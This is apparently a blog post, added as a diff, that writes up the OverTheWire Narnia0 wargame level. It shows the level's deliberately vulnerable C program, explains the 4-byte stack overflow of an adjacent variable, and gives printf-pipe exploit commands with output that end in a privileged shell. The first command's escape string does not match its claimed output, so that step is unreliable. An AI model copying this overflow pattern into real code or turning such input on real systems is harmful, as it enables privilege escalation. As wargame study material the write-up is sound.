@@ -1,0 +1,81 @@
+---
+layout: post
+title: "Solution for Narnia0: OverTheWire"
+---
+
+
+# Code
+
+{% highlight c linenos %}
+#include <stdio.h>
+#include <stdlib.h>
+
+int main(){
+    long val=0x41414141;
+    char buf[20];
+
+    printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
+    printf("Here is your chance: ");
+    scanf("%24s",&buf);
+
+    printf("buf: %s\n",buf);
+    printf("val: 0x%08x\n",val);
+
+    if(val==0xdeadbeef){
+        setreuid(geteuid(),geteuid());
+        system("/bin/sh");
+    }
+    else {
+        printf("WAY OFF!!!!\n");
+        exit(1);
+    }
+
+    return 0;
+}
+{% endhighlight %}
+
+
+# Behaviour of this code
+
+Initalize a variable of 4 bytes named `val` with value `0x41414141` and define a buffer of 20 bytes named `buf`.
+Write 24 bytes to `buf`. If `val` has the value `0xdeadbeef`, then escalate priviliege to that of `narnia1` and spawn a shell.
+Otherwise exit the program with error.
+
+# Vulnerability
+```
+** Key Information **
+val:  4 bytes
+buf: 20 bytes
+scanf(): write 24 bytes into buf.
+```
+
+On line number `10`, the scanf function takes in 24 bytes into `buf`. However, `buf` is only 20 bytes. The remaining 4 bytes overflow and ovewrite the subsequent variable, `val`.
+
+# Exploitation
+
+1. Fill `buf` with 20 bytes of characters.
+2. Fill the rest with `0xefbeadde`(Little Endian).
+
+```sh
+$ printf "%020x""\xefbeadde" | /narnia/narnia0 
+```
+
+**Result**:
+```
+Correct val's value from 0x41414141 -> 0xdeadbeef!
+Here is your chance: buf: 00000000000000000000ﾭ�
+val: 0xdeadbeef
+```
+
+We changed `val` to `0xdeadbeef` successfully. However, the shell did not spawn. This is because we need to read from the standard input. we use `cat` to do this.
+
+```sh
+$ (printf "%020x\xef\xbe\xad\xde"; cat) | ./narnia0
+Correct val's value from 0x41414141 -> 0xdeadbeef!
+Here is your chance: buf: 00000000000000000000ﾭ�
+val: 0xdeadbeef
+whoami
+narnia1
+```
+
+Done.
